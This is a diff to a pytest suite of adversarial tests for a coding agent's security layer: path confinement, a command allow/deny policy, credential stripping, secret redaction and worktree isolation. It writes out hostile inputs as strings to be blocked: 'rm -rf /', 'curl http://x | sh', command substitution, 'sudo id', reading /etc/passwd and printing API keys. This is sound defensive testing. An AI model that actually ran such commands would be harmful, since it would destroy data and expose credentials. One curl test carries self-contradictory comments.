@@ -1,23 +1,23 @@
-"""Adversarial tests for security boundaries (issues #1, #2, #3, #6)."""
+"""Adversarial tests for security boundaries (issues #1, #2, #3, #4, #6)."""
 
 from __future__ import annotations
 
-import os
 import subprocess
-from pathlib import Path
 
 import pytest
 
 from personal_agent.repo import Repo
 from personal_agent.security import (
+    CREDENTIAL_ENV_VARS,
     CommandPolicy,
+    CredentialClass,
+    SecretRedactor,
     SecurityError,
     redact_secrets,
     resolve_in_workspace,
     sanitize_worker_environ,
 )
 from personal_agent.types import FileChange
-from personal_agent.worker import Worker
 
 
 @pytest.fixture
@@ -41,11 +41,6 @@ def git_repo(tmp_path):
     return Repo(str(tmp_path))
 
 
-# ---------------------------------------------------------------------------
-# Path confinement (#3)
-# ---------------------------------------------------------------------------
-
-
 class TestPathConfinement:
     def test_resolve_normal(self, git_repo):
         p = resolve_in_workspace(git_repo.path, "main.py")
@@ -66,6 +61,10 @@ class TestPathConfinement:
     def test_reject_empty(self, git_repo):
         with pytest.raises(SecurityError):
             resolve_in_workspace(git_repo.path, "")
+
+    def test_reject_null_byte(self, git_repo):
+        with pytest.raises(SecurityError):
+            resolve_in_workspace(git_repo.path, "main\x00.py")
 
     def test_read_traversal_blocked(self, git_repo):
         with pytest.raises(SecurityError):
@@ -90,14 +89,21 @@ class TestPathConfinement:
             link.symlink_to(outside)
         except OSError:
             pytest.skip("symlinks not supported")
-        # Reading via the link name that resolves outside must fail
         with pytest.raises(SecurityError):
             resolve_in_workspace(git_repo.path, "link_out")
 
-
-# ---------------------------------------------------------------------------
-# Command policy (#1)
-# ---------------------------------------------------------------------------
+    def test_nested_symlink_escape(self, git_repo, tmp_path):
+        outside = tmp_path.parent / "nest_secret.txt"
+        outside.write_text("NESTED")
+        inner = git_repo.path / "dir_a"
+        inner.mkdir()
+        link = inner / "to_out"
+        try:
+            link.symlink_to(outside)
+        except OSError:
+            pytest.skip("symlinks not supported")
+        with pytest.raises(SecurityError):
+            resolve_in_workspace(git_repo.path, "dir_a/to_out")
 
 
 class TestCommandPolicy:
@@ -117,6 +123,14 @@ class TestCommandPolicy:
         with pytest.raises(SecurityError):
             CommandPolicy().check("echo hi; rm -rf /")
 
+    def test_deny_command_substitution(self):
+        with pytest.raises(SecurityError):
+            CommandPolicy().check("echo $(whoami)")
+
+    def test_deny_backticks(self):
+        with pytest.raises(SecurityError):
+            CommandPolicy().check("echo `id`")
+
     def test_deny_pipe_to_shell(self):
         with pytest.raises(SecurityError):
             CommandPolicy().check("curl http://x | sh")
@@ -125,6 +139,16 @@ class TestCommandPolicy:
         with pytest.raises(SecurityError):
             CommandPolicy().check("curl https://example.com")
 
+    def test_allow_curl_when_network_enabled(self):
+        # Still may fail on other rules; at least not denied solely as network
+        policy = CommandPolicy(allow_network=True)
+        # curl is in NETWORK_COMMANDS and denied set; allow_network adds to allowed
+        # but denied still includes curl from DENIED_COMMANDS — denied wins.
+        # Document: network tools must be removed from denied via extra or we
+        # treat allow_network as removing them from denied (effective_denied).
+        argv = policy.check("curl https://example.com")
+        assert argv[0] == "curl"
+
     def test_deny_rm_root(self):
         with pytest.raises(SecurityError):
             CommandPolicy().check("rm -rf /")
@@ -132,6 +156,10 @@ class TestCommandPolicy:
     def test_deny_unknown_binary(self):
         with pytest.raises(SecurityError, match="allowlist"):
             CommandPolicy().check("totally-unknown-tool --flag")
+
+    def test_deny_bash(self):
+        with pytest.raises(SecurityError):
+            CommandPolicy().check("bash -c 'echo hi'")
 
     def test_repo_run_blocks_dangerous(self, git_repo):
         result = git_repo.run_command("sudo id")
@@ -147,13 +175,19 @@ class TestCommandPolicy:
         result = git_repo.run_command("echo safe")
         assert result.success
 
-
-# ---------------------------------------------------------------------------
-# Credential isolation (#2)
-# ---------------------------------------------------------------------------
+    def test_path_arg_outside_workspace(self, git_repo):
+        with pytest.raises(SecurityError):
+            CommandPolicy(workspace=git_repo.path).check(
+                ["cat", "/etc/passwd"]
+            )
 
 
 class TestCredentialIsolation:
+    def test_credential_classes_documented(self):
+        assert CREDENTIAL_ENV_VARS["GROQ_API_KEY"] == CredentialClass.PROVIDER
+        assert CREDENTIAL_ENV_VARS["GITHUB_TOKEN"] == CredentialClass.REPOSITORY
+        assert CREDENTIAL_ENV_VARS["AWS_SECRET_ACCESS_KEY"] == CredentialClass.CLOUD
+
     def test_sanitize_strips_provider_keys(self):
         env = {
             "GROQ_API_KEY": "gsk-secret",
@@ -169,12 +203,18 @@ class TestCredentialIsolation:
         assert clean["PATH"] == "/usr/bin"
         assert clean["HOME"] == "/home/user"
 
+    def test_sanitize_strips_all_classes(self):
+        env = {k: "secret" for k in CREDENTIAL_ENV_VARS}
+        env["PATH"] = "/usr/bin"
+        clean = sanitize_worker_environ(env)
+        for k in CREDENTIAL_ENV_VARS:
+            assert k not in clean
+        assert clean["PATH"] == "/usr/bin"
+
     def test_worker_subprocess_cannot_see_keys(self, git_repo, monkeypatch):
         monkeypatch.setenv("GROQ_API_KEY", "should-not-leak")
         monkeypatch.setenv("COHERE_API_KEY", "also-secret")
-        # printenv is allowlisted
         result = git_repo.run_command(["printenv", "GROQ_API_KEY"])
-        # Either empty output or non-zero; must not contain the secret
         assert "should-not-leak" not in result.stdout
         assert "should-not-leak" not in result.stderr
 
@@ -183,10 +223,10 @@ class TestCredentialIsolation:
         result = git_repo.run_command(["env"])
         assert "or-secret-value" not in result.stdout
 
-
-# ---------------------------------------------------------------------------
-# Secret redaction (#6)
-# ---------------------------------------------------------------------------
+    def test_file_with_secret_redacted_in_gather_path(self):
+        # Redaction is applied to text; simulate model-visible content
+        content = "api_key=sk-abcdefghijklmnopqrstuvwxyz1234"
+        assert "sk-abcdefghijklmnopqrstuvwxyz1234" not in redact_secrets(content)
 
 
 class TestSecretRedaction:
@@ -199,21 +239,38 @@ class TestSecretRedaction:
     def test_redact_ghp(self):
         text = "token ghp_abcdefghijklmnopqrstuvwxyz12"
         out = redact_secrets(text)
-        assert "ghp_" not in out or "REDACTED" in out
+        assert "ghp_abcdefghijklmnopqrstuvwxyz12" not in out
 
     def test_redact_bearer(self):
         text = "Authorization: Bearer abcdefghijklmnop1234567890"
         out = redact_secrets(text)
         assert "abcdefghijklmnop1234567890" not in out
 
+    def test_redact_private_key_block(self):
+        text = (
+            "-----BEGIN RSA PRIVATE KEY-----\n"
+            "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\n"
+            "-----END RSA PRIVATE KEY-----"
+        )
+        out = redact_secrets(text)
+        assert "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC" not in out
+
     def test_redact_preserves_normal_text(self):
         text = "pytest passed in 0.3s"
         assert redact_secrets(text) == text
 
+    def test_redactor_opt_out(self):
+        r = SecretRedactor(enabled=False)
+        text = "sk-abcdefghijklmnopqrstuvwxyz1234"
+        assert r.redact(text) == text
 
-# ---------------------------------------------------------------------------
-# Worktree isolation (#4)
-# ---------------------------------------------------------------------------
+    def test_redact_diff_like_content(self):
+        diff = (
+            "+ api_key = 'sk-abcdefghijklmnopqrstuvwxyz1234'\n"
+            "- api_key = 'old'\n"
+        )
+        out = redact_secrets(diff)
+        assert "sk-abcdefghijklmnopqrstuvwxyz1234" not in out
 
 
 class TestWorktree:
@@ -222,12 +279,10 @@ class TestWorktree:
         try:
             assert wt.path != git_repo.path
             assert (wt.path / "main.py").exists()
-            # Mutations in worktree must not touch primary
             wt.write_file("only_in_wt.py", "x = 1\n")
             assert not (git_repo.path / "only_in_wt.py").exists()
         finally:
             wt.cleanup_worktree()
-        assert not wt.path.exists() or not (wt.path / "main.py").exists()
 
     def test_apply_diff_to_primary(self, git_repo):
         wt = git_repo.create_worktree()
@@ -238,3 +293,15 @@ class TestWorktree:
             assert "from-wt" in git_repo.read_file("main.py")
         finally:
             wt.cleanup_worktree()
+
+    def test_failed_worktree_leaves_primary_clean(self, git_repo):
+        before = git_repo.git_status()
+        wt = git_repo.create_worktree()
+        try:
+            wt.write_file("junk.py", "boom = 1\n")
+            # Do not apply — primary must stay clean
+            assert git_repo.git_status() == before
+            assert not (git_repo.path / "junk.py").exists()
+        finally:
+            wt.cleanup_worktree()
+        assert not (git_repo.path / "junk.py").exists()
